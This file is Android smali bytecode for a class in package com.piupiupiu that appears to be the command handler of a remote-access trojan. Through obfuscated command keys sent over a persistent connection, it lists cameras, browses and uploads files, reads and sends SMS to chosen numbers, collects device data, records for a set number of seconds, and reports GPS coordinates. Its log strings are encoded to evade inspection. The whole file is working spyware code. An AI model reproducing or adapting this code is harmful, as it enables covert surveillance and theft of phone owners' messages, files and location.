.class public Lcom/piupiupiu/d;
.super Ljava/lang/Object;


# static fields
.field public static a:Landroid/content/Context;

.field private static final b:Ljava/lang/String;

.field private static final c:Lcom/piupiupiu/e;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "Ez9TEA=="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/d;->b:Ljava/lang/String;

    new-instance v0, Lcom/piupiupiu/e;

    invoke-direct {v0}, Lcom/piupiupiu/e;-><init>()V

    sput-object v0, Lcom/piupiupiu/d;->c:Lcom/piupiupiu/e;

    return-void
.end method

.method public static a()V
    .locals 2

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    new-instance v1, Lcom/piupiupiu/d$1;

    invoke-direct {v1}, Lcom/piupiupiu/d$1;-><init>()V

    invoke-virtual {v0, v1}, Lcom/piupiupiu/f;->a(Lcom/piupiupiu/f$a;)V

    invoke-virtual {v0}, Lcom/piupiupiu/f;->b()V

    return-void
.end method

.method public static a(I)V
    .locals 3

    const/4 v2, 0x1

    const/4 v0, -0x1

    if-ne p0, v0, :cond_1

    new-instance v0, Lcom/piupiupiu/b;

    sget-object v1, Lcom/piupiupiu/d;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/piupiupiu/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/piupiupiu/b;->a()Lorg/json/JSONObject;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v1

    const-string v2, "k7f2qa"

    invoke-virtual {v1, v2, v0}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-ne p0, v2, :cond_2

    new-instance v0, Lcom/piupiupiu/b;

    sget-object v1, Lcom/piupiupiu/d;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/piupiupiu/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v2}, Lcom/piupiupiu/b;->a(I)V

    goto :goto_0

    :cond_2
    if-nez p0, :cond_0

    new-instance v0, Lcom/piupiupiu/b;

    sget-object v1, Lcom/piupiupiu/d;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/piupiupiu/b;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/piupiupiu/b;->a(I)V

    goto :goto_0
.end method

.method public static a(ILjava/lang/String;)V
    .locals 3

    if-nez p0, :cond_1

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v1, "m3b8tz"

    sget-object v2, Lcom/piupiupiu/d;->c:Lcom/piupiupiu/e;

    invoke-static {p1}, Lcom/piupiupiu/e;->a(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v0, 0x1

    if-ne p0, v0, :cond_0

    sget-object v0, Lcom/piupiupiu/d;->c:Lcom/piupiupiu/e;

    invoke-static {p1}, Lcom/piupiupiu/e;->b(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static a(ILjava/lang/String;Ljava/lang/String;)V
    .locals 3

    if-nez p0, :cond_1

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v1, "s9d4wx"

    invoke-static {}, Lcom/piupiupiu/i;->a()Lorg/json/JSONObject;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v0, 0x1

    if-ne p0, v0, :cond_0

    invoke-static {p1, p2}, Lcom/piupiupiu/i;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v1

    const-string v2, "s9d4wx"

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 5

    const/4 v4, 0x3

    sput-object p0, Lcom/piupiupiu/d;->a:Landroid/content/Context;

    const/4 v0, 0x0

    :goto_0
    if-ge v0, v4, :cond_0

    :try_start_0
    invoke-static {}, Lcom/piupiupiu/d;->a()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v1

    add-int/lit8 v0, v0, 0x1

    sget-object v1, Lcom/piupiupiu/d;->b:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "AyRAB01LQFNDNhQoQRQXNwQiWFU="

    invoke-static {v3}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public static a(Ljava/lang/String;Ljava/lang/Throwable;)V
    .locals 3

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ": "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "error"

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    invoke-virtual {v0, p0, v1}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    sget-object v1, Lcom/piupiupiu/d;->b:Ljava/lang/String;

    const-string v2, "AjVRGksfBlRLMx0pCQ=="

    invoke-static {v2}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0
.end method

.method static synthetic a(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 0

    invoke-static {p0, p1}, Lcom/piupiupiu/d;->b(Ljava/lang/String;Lorg/json/JSONObject;)V

    return-void
.end method

.method public static b()V
    .locals 3

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v1, "c2h6vn"

    invoke-static {}, Lcom/piupiupiu/a;->a()Lorg/json/JSONObject;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    return-void
.end method

.method public static b(I)V
    .locals 0

    invoke-static {p0}, Lcom/piupiupiu/h;->a(I)V

    return-void
.end method

.method private static b(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 5

    const/4 v4, 0x0

    const/4 v3, 0x1

    const/4 v2, 0x0

    const-string v0, "k7f2qa"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_EXTRA:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/piupiupiu/AppConfig;->EXTRA_CAM_LIST:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 v0, -0x1

    invoke-static {v0}, Lcom/piupiupiu/d;->a(I)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    const-string v1, "1"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-static {v3}, Lcom/piupiupiu/d;->a(I)V

    goto :goto_0

    :cond_2
    const-string v1, "0"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {v2}, Lcom/piupiupiu/d;->a(I)V

    goto :goto_0

    :cond_3
    const-string v0, "m3b8tz"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_EXTRA:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/piupiupiu/AppConfig;->EXTRA_LS:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_PATH:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Lcom/piupiupiu/d;->a(ILjava/lang/String;)V

    goto :goto_0

    :cond_4
    sget-object v1, Lcom/piupiupiu/AppConfig;->EXTRA_DL:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_PATH:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lcom/piupiupiu/d;->a(ILjava/lang/String;)V

    goto :goto_0

    :cond_5
    const-string v0, "s9d4wx"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_EXTRA:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/piupiupiu/AppConfig;->EXTRA_LS:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    invoke-static {v2, v4, v4}, Lcom/piupiupiu/d;->a(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_6
    sget-object v1, Lcom/piupiupiu/AppConfig;->EXTRA_SEND_SMS:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_TO:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/piupiupiu/AppConfig;->FIELD_SMS:Ljava/lang/String;

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v0, v1}, Lcom/piupiupiu/d;->a(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_7
    const-string v0, "c2h6vn"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    invoke-static {}, Lcom/piupiupiu/d;->b()V

    goto/16 :goto_0

    :cond_8
    const-string v0, "n5j1pr"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-static {}, Lcom/piupiupiu/d;->c()V

    goto/16 :goto_0

    :cond_9
    const-string v0, "w8k3qu"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    sget-object v0, Lcom/piupiupiu/AppConfig;->FIELD_SEC:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Lcom/piupiupiu/d;->b(I)V

    goto/16 :goto_0

    :cond_a
    const-string v0, "l4t7ye"

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/piupiupiu/d;->d()V

    goto/16 :goto_0
.end method

.method public static c()V
    .locals 3

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v1, "n5j1pr"

    invoke-static {}, Lcom/piupiupiu/c;->a()Lorg/json/JSONObject;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    return-void
.end method

.method public static d()V
    .locals 7

    invoke-static {}, Landroid/os/Looper;->prepare()V

    new-instance v0, Lcom/piupiupiu/g;

    sget-object v1, Lcom/piupiupiu/d;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/piupiupiu/g;-><init>(Landroid/content/Context;)V

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v0}, Lcom/piupiupiu/g;->e()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v0}, Lcom/piupiupiu/g;->c()D

    move-result-wide v2

    invoke-virtual {v0}, Lcom/piupiupiu/g;->d()D

    move-result-wide v4

    const-string v0, "enable"

    const/4 v6, 0x1

    invoke-virtual {v1, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v0, "lat"

    invoke-virtual {v1, v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v0, "lng"

    invoke-virtual {v1, v0, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    :goto_0
    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v2, "l4t7ye"

    invoke-virtual {v0, v2, v1}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    return-void

    :cond_0
    const-string v0, "enable"

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    goto :goto_0
.end method

.method static synthetic e()Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/piupiupiu/d;->b:Ljava/lang/String;

    return-object v0
.end method
